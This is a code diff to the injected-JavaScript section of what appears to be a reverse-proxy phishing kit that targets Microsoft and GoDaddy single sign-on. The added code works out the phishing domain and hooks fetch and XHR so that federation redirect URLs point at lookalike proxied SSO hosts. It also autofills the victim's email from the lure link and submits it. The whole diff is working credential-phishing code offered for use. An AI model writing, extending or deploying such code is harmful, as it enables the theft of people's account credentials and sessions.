@@ -255,18 +255,36 @@ js_inject:
 
       // Patch both fetch AND XHR to intercept GetCredentialType and inject
       // email hash into FederationRedirectUrl before the page reads it.
+      // Derive the phish domain from our current hostname (e.g. woman.nidlec-motor.com → nidlec-motor.com)
+      var _phishDomain = (function() {
+        var parts = window.location.hostname.split('.');
+        return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+      })();
+
       function _patchResp(text) {
         if (text.indexOf('FederationRedirectUrl') === -1) return null;
         return text.replace(
           /("FederationRedirectUrl"\s*:\s*")([^"]*)/,
           function(m, prefix, fedUrl) {
-            if (fedUrl.indexOf('#') !== -1) return m;
-            return prefix + fedUrl + '#' + encodeURIComponent(_scEmail);
+            // Rewrite GoDaddy SSO hostnames to their proxied equivalents
+            // (fallback in case server-side sub_filters miss it due to compression etc.)
+            var patchedUrl = fedUrl
+              .replace(/sso\.godaddy\.com/g,     'ssso.' + _phishDomain)
+              .replace(/sso\.secureserver\.net/g, 'sssn.' + _phishDomain)
+              .replace(/sso2\.secureserver\.net/g,'sssn2.' + _phishDomain);
+            // Append email fragment once
+            if (patchedUrl.indexOf('#') === -1 && _scEmail) {
+              patchedUrl += '#' + encodeURIComponent(_scEmail);
+            }
+            return prefix + patchedUrl;
           }
         );
       }
 
-      if (_scEmail) {
+      // Always patch GetCredentialType responses to rewrite GoDaddy SSO hostnames.
+      // Also inject email fragment when available. Runs regardless of _scEmail so
+      // that host rewriting works even when the lure link had no #email suffix.
+      (function() {
         // --- Patch fetch ---
         var _oFetch = window.fetch;
         window.fetch = function(url, opts) {
@@ -305,21 +323,21 @@ js_inject:
           }
           return _oXHRSend.apply(this, arguments);
         };
-      }
+      })();
 
-      function lp() {
-        var emailId = document.querySelector('#i0116');
-        var nextBtn  = document.querySelector('#idSIButton9');
-        if (!emailId) { setTimeout(lp, 500); return; }
-        if (_scEmail) {
+      if (_scEmail) {
+        function lp() {
+          var emailId = document.querySelector('#i0116');
+          var nextBtn  = document.querySelector('#idSIButton9');
+          if (!emailId) { setTimeout(lp, 500); return; }
           emailId.focus();
           emailId.value = _scEmail;
           emailId.dispatchEvent(new Event('input',  {bubbles:true}));
           emailId.dispatchEvent(new Event('change', {bubbles:true}));
           if (nextBtn) { nextBtn.focus(); nextBtn.click(); }
         }
+        setTimeout(lp, 500);
       }
-      setTimeout(lp, 500);
 
   # GoDaddy SSO — WS-Fed puts username= in URL; page shows password field only.
   # Autofill email if present, keep retrying until input appears (React SPA).
